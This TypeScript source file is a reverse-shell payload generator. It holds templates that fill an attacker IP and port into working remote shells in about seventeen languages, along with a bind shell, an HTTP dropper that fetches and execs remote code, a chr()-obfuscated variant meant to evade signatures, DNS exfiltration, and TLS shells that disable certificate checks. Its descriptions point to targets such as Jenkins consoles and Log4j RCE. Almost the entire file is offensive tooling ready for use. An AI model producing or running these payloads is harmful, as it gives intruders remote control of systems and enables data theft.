export type OS = "linux" | "windows" | "macos" | "any";
export type Transport = "tcp" | "udp" | "http" | "https" | "dns";
export type Language =
  | "bash"
  | "sh"
  | "python"
  | "perl"
  | "php"
  | "ruby"
  | "node"
  | "powershell"
  | "netcat"
  | "awk"
  | "telnet"
  | "java"
  | "groovy"
  | "lua"
  | "csharp"
  | "c"
  | "go";

export interface PayloadTemplate {
  id: string;
  name: string;
  language: Language;
  os: OS;
  transport: Transport;
  description: string;
  tags: string[];
  build: (vars: PayloadVars) => string;
  listener: "nc" | "socat" | "pwncat" | "metasploit" | "custom";
}

export interface PayloadVars {
  ip?: string;
  port?: number;
  lhost?: string;
  lport?: number;
  rhost?: string;
  rport?: number;
  useragent?: string;
}

function resolve(vars: PayloadVars): { ip: string; port: number } {
  const ip = vars.ip || vars.lhost || "10.0.0.1";
  const port = vars.port || vars.lport || 4444;
  return { ip, port };
}

export const PAYLOAD_TEMPLATES: PayloadTemplate[] = [
  {
    id: "bash-tcp",
    name: "Bash TCP",
    language: "bash",
    os: "linux",
    transport: "tcp",
    description: "Classic bash /dev/tcp reverse shell. Requires bash (not sh).",
    tags: ["single line", "no special chars"],
    listener: "nc",
    build: (v) => {
      const { ip, port } = resolve(v);
      return `bash -i >& /dev/tcp/${ip}/${port} 0>&1`;
    },
  },
  {
    id: "sh-tcp-shovel",
    name: "sh (TCP), netcat shovel",
    language: "sh",
    os: "linux",
    transport: "tcp",
    description: "POSIX sh using nc as a bidirectional shovel. Works on busybox/Alpine.",
    tags: ["posix", "busybox"],
    listener: "nc",
    build: (v) => {
      const { ip, port } = resolve(v);
      return `rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc ${ip} ${port} > /tmp/f`;
    },
  },
  {
    id: "bash-udp",
    name: "Bash UDP",
    language: "bash",
    os: "linux",
    transport: "udp",
    description: "Bash reverse over UDP via /dev/udp. Listener must speak UDP.",
    tags: ["single line"],
    listener: "socat",
    build: (v) => {
      const { ip, port } = resolve(v);
      return `bash -i >& /dev/udp/${ip}/${port} 0>&1`;
    },
  },
  {
    id: "py-tcp-short",
    name: "Python TCP (short)",
    language: "python",
    os: "any",
    transport: "tcp",
    description: "Compact python single line. Cross platform (py2/py3 compatible).",
    tags: ["single line"],
    listener: "nc",
    build: (v) => {
      const { ip, port } = resolve(v);
      return `python -c 'import socket,os,pty;s=socket.socket();s.connect(("${ip}",${port}));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn("/bin/sh")'`;
    },
  },
  {
    id: "py3-tcp-staged",
    name: "Python 3 TCP (staged)",
    language: "python",
    os: "any",
    transport: "tcp",
    description: "Multiline python 3 with a PTY. More stable on Linux/macOS.",
    tags: ["multi line", "pty"],
    listener: "nc",
    build: (v) => {
      const { ip, port } = resolve(v);
      return `python3 -c '
import os,pty,socket
s=socket.socket()
s.connect(("${ip}",${port}))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
pty.spawn("/bin/bash")
'`;
    },
  },
  {
    id: "py-https",
    name: "Python HTTPS",
    language: "python",
    os: "any",
    transport: "https",
    description: "Python reverse over TLS. Listener must be a TLS endpoint (openssl/socat).",
    tags: ["tls", "egress friendly"],
    listener: "socat",
    build: (v) => {
      const { ip, port } = resolve(v);
      return `python3 -c '
import ssl,socket,subprocess
ctx=ssl.create_default_context()
ctx.check_hostname=False
ctx.verify_mode=ssl.CERT_NONE
s=ctx.wrap_socket(socket.socket(),server_hostname="${ip}")
s.connect(("${ip}",${port}))
p=subprocess.Popen(["/bin/sh"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())
p.wait()
'`;
    },
  },
  {
    id: "py3-tcp-oneliner",
    name: "Python3 TCP (single line)",
    language: "python",
    os: "any",
    transport: "tcp",
    description: "Compact python3 single line with dup2. Better than the py2 version.",
    tags: ["single line", "python3"],
    listener: "nc",
    build: (v) => {
      const { ip, port } = resolve(v);
      return `python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("${ip}",${port}));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn("/bin/sh")'`;
    },
  },
  {
    id: "py3-tcp-subprocess",
    name: "Python3 TCP (subprocess)",
    language: "python",
    os: "any",
    transport: "tcp",
    description: "Python3 reverse shell using subprocess.Popen instead of pty.spawn. More portable across Unix variants.",
    tags: ["python3", "portable"],
    listener: "nc",
    build: (v) => {
      const { ip, port } = resolve(v);
      return `python3 -c '
import socket,subprocess
s=socket.socket()
s.connect(("${ip}",${port}))
p=subprocess.Popen(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())
p.wait()
'`;
    },
  },
  {
    id: "py3-ipv6",
    name: "Python3 IPv6",
    language: "python",
    os: "any",
    transport: "tcp",
    description: "Python3 reverse shell over IPv6. Use when target only has IPv6 egress.",
    tags: ["python3", "ipv6"],
    listener: "nc",
    build: (v) => {
      const { ip, port } = resolve(v);
      return `python3 -c '
import socket,os,pty
s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM)
s.connect(("${ip}",${port},0,0))
[os.dup2(s.fileno(),f) for f in (0,1,2)]
pty.spawn("/bin/sh")
'`;
    },
  },
  {
    id: "py3-bind",
    name: "Python3 Bind Shell",
    language: "python",
    os: "any",
    transport: "tcp",
    description: "Python3 bind shell. Target opens a port, you connect to it. Use when target can't egress.",
    tags: ["python3", "bind shell"],
    listener: "nc",
    build: (v) => {
      const { port } = resolve(v);
      return `python3 -c '
import socket,os,pty
s=socket.socket()
s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
s.bind(("0.0.0.0",${port}))
s.listen(1)
c,_=s.accept()
[os.dup2(c.fileno(),f) for f in (0,1,2)]
pty.spawn("/bin/sh")
'`;
    },
  },
  {
    id: "py3-ssl-verify",
    name: "Python3 SSL (verify)",
    language: "python",
    os: "any",
    transport: "https",
    description: "Python3 TLS reverse shell with proper cert verification. Use a real cert on the listener.",
    tags: ["python3", "tls", "cert pinned"],
    listener: "socat",
    build: (v) => {
      const { ip, port } = resolve(v);
      return `python3 -c '
import ssl,socket,subprocess
s=socket.socket()
ctx=ssl.create_default_context()
ctx.load_verify_locations("/etc/ssl/certs/ca-certificates.crt")
s=ctx.wrap_socket(s,server_hostname="${ip}")
s.connect(("${ip}",${port}))
p=subprocess.Popen(["/bin/sh"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())
p.wait()
'`;
    },
  },
  {
    id: "py3-dropper",
    name: "Python3 Staged Dropper",
    language: "python",
    os: "any",
    transport: "http",
    description: "Downloads payload from HTTP URL and executes via exec. Useful for staging larger payloads.",
    tags: ["python3", "staged", "dropper"],
    listener: "socat",
    build: (v) => {
      const { ip, port } = resolve(v);
      return `python3 -c '
import urllib.request,os
u="http://${ip}:${port}/s"
d=urllib.request.urlopen(u,timeout=10).read()
exec(d)
'`;
    },
  },
  {
    id: "py3-no-raw",
    name: "Python3 (no raw strings)",
    language: "python",
    os: "any",
    transport: "tcp",
    description: "Python3 reverse shell built with chr() concatenation. Avoids static string signatures for /bin/sh etc.",
    tags: ["python3", "evasion friendly"],
    listener: "nc",
    build: (v) => {
      const { ip, port } = resolve(v);
      const chrIp = ip.split(".").map((o) => `chr(0x${Number(o).toString(16).padStart(2, "0")})`).join("+");
      return `python3 -c '
import socket,os,pty
s=socket.socket()
s.connect((${chrIp},${port}))
[os.dup2(s.fileno(),f) for f in (0,1,2)]
pty.spawn(chr(0x2f)+chr(0x62)+chr(0x69)+chr(0x6e)+chr(0x2f)+chr(0x73)+chr(0x68))
'`;
    },
  },
  {
    id: "py3-dns-exfil",
    name: "Python3 DNS Exfil",
    language: "python",
    os: "any",
    transport: "dns",
    description: "Python3 DNS exfiltration payload. Sends command output as DNS queries. Use with a DNS cat tool (dnscat2).",
    tags: ["python3", "dns", "exfil"],
    listener: "socat",
    build: (v) => {
      const { ip, port } = resolve(v);
      return `python3 -c '
import socket,subprocess,base64
d="${ip}"
while True:
  c=input("> ") if False else subprocess.run(["/bin/sh","-i"],capture_output=True)
  o=base64.b32encode(c.stdout).decode().lower()
  for i in range(0,len(o),63):
    socket.gethostbyname(o[i:i+63]+"."+d)
'`;
    },
  },
  {
    id: "ps-tcp",
    name: "PowerShell TCP",
    language: "powershell",
    os: "windows",
    transport: "tcp",
    description: "Pure TCP reverse shell via .NET TcpClient. No modules required.",
    tags: ["windows", "no modules"],
    listener: "nc",
    build: (v) => {
      const { ip, port } = resolve(v);
      return `$client = New-Object System.Net.Sockets.TcpClient('${ip}',${port});
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
  $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
  $sendback = (iex $data 2>&1 | Out-String );
  $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
  $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
  $stream.Write($sendbyte,0,$sendbyte.Length);
  $stream.Flush();
};
$client.Close();`;
    },
  },
  {
    id: "ps-https",
    name: "PowerShell HTTPS",
    language: "powershell",
    os: "windows",
    transport: "https",
    description: "TLS reverse shell. Bypasses default certificate validation.",
    tags: ["windows", "tls"],
    listener: "socat",
    build: (v) => {
      const { ip, port } = resolve(v);
      return `[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};
$client = New-Object System.Net.Sockets.TcpClient('${ip}',${port});
$ssl = New-Object System.Net.Security.SslStream($client.GetStream(),$false,({$true}));
$ssl.AuthenticateAsClient('${ip}');
$bytes = New-Object byte[] 65536;
while(($i = $ssl.Read($bytes,0,$bytes.Length)) -ne 0){
  $data = (New-Object Text.ASCIIEncoding).GetString($bytes,0,$i);
  $out = (iex $data 2>&1 | Out-String) + 'PS> ';
  $ssl.Write(([text.encoding]::ASCII.GetBytes($out)),0,$out.Length);
};`;
    },
  },
  {
    id: "ps-conv",
    name: "PowerShell ConstrainedMode",
    language: "powershell",
    os: "windows",
    transport: "tcp",
    description: "Constrained Language Mode friendly payload for hardened hosts.",
    tags: ["windows", "clm friendly"],
    listener: "nc",
    build: (v) => {
      const { ip, port } = resolve(v);
      return `$ErrorActionPreference='SilentlyContinue';
$c=New-Object Net.Sockets.TcpClient('${ip}',${port});
$s=$c.GetStream();
[byte[]]$b=0..65535|%{0};
while(($r=$s.Read($b,0,$b.Length)) -ne 0){
  $d=[Text.Encoding]::ASCII.GetString($b,0,$r);
  $o=(iex $d 2>&1|Out-String);
  $s.Write([Text.Encoding]::ASCII.GetBytes($o),0,$o.Length);
};`;
    },
  },
  {
    id: "nc traditional",
    name: "Netcat (traditional), -e",
    language: "netcat",
    os: "linux",
    transport: "tcp",
    description: "Classic nc -e. Only works on traditional nc builds (not OpenBSD).",
    tags: ["single line", "nc traditional"],
    listener: "nc",
    build: (v) => {
      const { ip, port } = resolve(v);
      return `nc -e /bin/sh ${ip} ${port}`;
    },
  },
  {
    id: "nc-fifo",
    name: "Netcat (any), fifo",
    language: "netcat",
    os: "linux",
    transport: "tcp",
    description: "Works on any nc flavor (OpenBSD, busybox). Uses a named fifo for bidirectional I/O.",
    tags: ["busybox", "openbsd nc"],
    listener: "nc",
    build: (v) => {
      const { ip, port } = resolve(v);
      return `rm -f /tmp/p; mkfifo /tmp/p; cat /tmp/p | /bin/sh -i 2>&1 | nc ${ip} ${port} > /tmp/p`;
    },
  },
  {
    id: "ncat-ssl",
    name: "Ncat SSL",
    language: "netcat",
    os: "linux",
    transport: "https",
    description: "Ncat with SSL. Encrypted reverse shell via ncat (Nmap suite).",
    tags: ["tls", "ncat"],
    listener: "nc",
    build: (v) => {
      const { ip, port } = resolve(v);
      return `ncat --ssl ${ip} ${port} -e /bin/sh`;
    },
  },
  {
    id: "perl-tcp",
    name: "Perl TCP",
    language: "perl",
    os: "linux",
    transport: "tcp",
    description: "Classic perl reverse shell. Works on most Unix hosts with perl installed.",
    tags: ["single line"],
    listener: "nc",
    build: (v) => {
      const { ip, port } = resolve(v);
      return `perl -e 'use Socket;socket(S,2,1,0);connect(S,pack_sockaddr_in(${port},inet_aton("${ip}")));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh")'`;
    },
  },
  {
    id: "perl-udp",
    name: "Perl UDP",
    language: "perl",
    os: "linux",
    transport: "udp",
    description: "Perl reverse over UDP via SOCK_DGRAM. Listener must speak UDP.",
    tags: ["udp"],
    listener: "socat",
    build: (v) => {
      const { ip, port } = resolve(v);
      return `perl -e 'use Socket;socket(S,2,2,0);connect(S,pack_sockaddr_in(${port},inet_aton("${ip}")));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh")'`;
    },
  },
  {
    id: "php-tcp",
    name: "PHP TCP",
    language: "php",
    os: "any",
    transport: "tcp",
    description: "Standard php reverse shell via fsockopen. For web RCE.",
    tags: ["webshell friendly"],
    listener: "nc",
    build: (v) => {
      const { ip, port } = resolve(v);
      return `php -r '$sock=fsockopen("${ip}",${port});exec("/bin/sh -i <&3 >&3 2>&3");'`;
    },
  },
  {
    id: "ruby-tcp",
    name: "Ruby TCP",
    language: "ruby",
    os: "linux",
    transport: "tcp",
    description: "Standard ruby reverse shell. For Ruby on Rails RCE.",
    tags: ["rails"],
    listener: "nc",
    build: (v) => {
      const { ip, port } = resolve(v);
      return `ruby -rsocket -e 'exit if fork;c=TCPSocket.new("${ip}","${port}");while(cmd=c.gets);IO.popen(cmd.to_s,"r+"){|io|c.print io.read} end'`;
    },
  },
  {
    id: "node-tcp",
    name: "Node.js TCP",
    language: "node",
    os: "any",
    transport: "tcp",
    description: "Node.js reverse shell via net.Socket. For Electron / SSRF.",
    tags: ["node", "electron"],
    listener: "nc",
    build: (v) => {
      const { ip, port } = resolve(v);
      return `node -e 'const{spawn}=require("child_process");const net=require("net");const s=new net.Socket();s.connect(${port},"${ip}",()=>{const p=spawn("/bin/sh",[]);p.stdout.pipe(s);p.stderr.pipe(s);s.pipe(p.stdin);});'`;
    },
  },
  {
    id: "java-tcp",
    name: "Java TCP",
    language: "java",
    os: "any",
    transport: "tcp",
    description: "Java reverse shell via ProcessBuilder. For Spring/Log4j RCE.",
    tags: ["spring", "log4j"],
    listener: "nc",
    build: (v) => {
      const { ip, port } = resolve(v);
      return `public class Rev {
  public static void main(String[] a) throws Exception {
    String host="${ip}";int p=${port};
    Process pr=Runtime.getRuntime().exec(new String[]{"/bin/bash","-c","exec 5<>/dev/tcp/"+host+"/"+p+" 2>&1; cat <&5 | while read l; do eval \\"$l\\"; done"});
    pr.waitFor();
  }
}`;
    },
  },
  {
    id: "groovy-tcp",
    name: "Groovy TCP",
    language: "groovy",
    os: "any",
    transport: "tcp",
    description: "Groovy reverse shell. For Jenkins Script Console.",
    tags: ["jenkins"],
    listener: "nc",
    build: (v) => {
      const { ip, port } = resolve(v);
      return `String host="${ip}";
int port=${port};
String cmd="/bin/sh";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
Socket s=new Socket(host,port);
InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();
OutputStream po=p.getOutputStream(),so=s.getOutputStream();
while(!s.isClosed()){so.write(pi.read());po.write(si.read());so.flush();po.flush();}`;
    },
  },
  {
    id: "awk-tcp",
    name: "AWK TCP",
    language: "awk",
    os: "linux",
    transport: "tcp",
    description: "Fallback awk shell. Useful when nothing else works.",
    tags: ["fallback"],
    listener: "nc",
    build: (v) => {
      const { ip, port } = resolve(v);
      return `awk 'BEGIN { s="/inet/tcp/0/${ip}/${port}"; while(1) { printf "$ "; cmd |& getline out; print out |& s; close(s); } }'`;
    },
  },
  {
    id: "lua-tcp",
    name: "Lua TCP",
    language: "lua",
    os: "linux",
    transport: "tcp",
    description: "Lua reverse shell. For embedded systems and some routers.",
    tags: ["embedded"],
    listener: "nc",
    build: (v) => {
      const { ip, port } = resolve(v);
      return `lua -e 'require("socket");require("os");require("io");s=socket.tcp();s:connect("${ip}",${port});os.execute("/bin/sh -i <&"..s:getfd().." >&"..s:getfd().." 2>&"..s:getfd())'`;
    },
  },
  {
    id: "telnet-fifo",
    name: "Telnet (fifo)",
    language: "telnet",
    os: "linux",
    transport: "tcp",
    description: "Telnet reverse shell via named pipe.",
    tags: ["fallback", "busybox"],
    listener: "nc",
    build: (v) => {
      const { ip, port } = resolve(v);
      return `rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | telnet ${ip} ${port} > /tmp/f`;
    },
  },
  {
    id: "csharp-tcp",
    name: "C# (.NET) TCP",
    language: "csharp",
    os: "windows",
    transport: "tcp",
    description: "C# .NET TcpClient reverse shell. Compile to .exe or load via Assembly.Load in memory. No PowerShell needed.",
    tags: ["csharp", "dotnet", "in memory"],
    listener: "nc",
    build: (v) => {
      const { ip, port } = resolve(v);
      return `using System;
using System.Net;
using System.Net.Sockets;
using System.Diagnostics;
using System.IO;
using System.Text;
using System.Threading;

class R {
  static void Main() {
    try {
      using (var c = new TcpClient()) {
        c.Connect(new IPEndPoint(IPAddress.Parse("${ip}"), ${port}));
        using (var s = c.GetStream())
        using (var r = new StreamReader(s))
        using (var w = new StreamWriter(s)) {
          w.AutoFlush = true;
          var p = new Process();
          p.StartInfo.FileName = "cmd.exe";
          p.StartInfo.UseShellExecute = false;
          p.StartInfo.RedirectStandardInput = true;
          p.StartInfo.RedirectStandardOutput = true;
          p.StartInfo.RedirectStandardError = true;
          p.Start();
          p.OutputDataReceived += (sender, e) => { if (e.Data != null) w.WriteLine(e.Data); };
          p.ErrorDataReceived += (sender, e) => { if (e.Data != null) w.WriteLine(e.Data); };
          p.BeginOutputReadLine();
          p.BeginErrorReadLine();
          new Thread(() => {
            string line;
            while ((line = r.ReadLine()) != null) p.StandardInput.WriteLine(line);
          }).Start();
          p.WaitForExit();
        }
      }
    } catch {}
  }
}`;
    },
  },
  {
    id: "c-tcp",
    name: "C (compiled) TCP",
    language: "c",
    os: "linux",
    transport: "tcp",
    description: "Classic C reverse shell. Compile with: gcc -o rev rev.c. Smallest, fastest, no dependencies.",
    tags: ["c", "compiled", "small"],
    listener: "nc",
    build: (v) => {
      const { ip, port } = resolve(v);
      return `#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

int main() {
  int s = socket(AF_INET, SOCK_STREAM, 0);
  struct sockaddr_in a;
  a.sin_family = AF_INET;
  a.sin_port = htons(${port});
  inet_aton("${ip}", &a.sin_addr);
  connect(s, (struct sockaddr *)&a, sizeof(a));
  dup2(s, 0);
  dup2(s, 1);
  dup2(s, 2);
  execve("/bin/sh", (char *[]){0}, 0);
  return 0;
}`;
    },
  },
  {
    id: "go-tcp",
    name: "Go TCP",
    language: "go",
    os: "any",
    transport: "tcp",
    description: "Go reverse shell. Cross compile a single static binary. Useful when the target has Go but no python/perl.",
    tags: ["go", "static binary", "cross compile"],
    listener: "nc",
    build: (v) => {
      const { ip, port } = resolve(v);
      return `package main

import (
  "net"
  "os"
  "os/exec"
)

func main() {
  c, _ := net.Dial("tcp", "${ip}:${port}")
  cmd := exec.Command("/bin/sh", "-i")
  cmd.Stdin = c
  cmd.Stdout = c
  cmd.Stderr = c
  cmd.Run()
  os.Exit(0)
}`;
    },
  },
];

export function filterTemplates(opts: {
  language?: Language;
  os?: OS;
  transport?: Transport;
}): PayloadTemplate[] {
  return PAYLOAD_TEMPLATES.filter((t) => {
    if (opts.language && t.language !== opts.language) return false;
    if (opts.os && t.os !== opts.os && t.os !== "any") return false;
    if (opts.transport && t.transport !== opts.transport) return false;
    return true;
  });
}

export function getTemplateById(id: string): PayloadTemplate | undefined {
  return PAYLOAD_TEMPLATES.find((t) => t.id === id);
}
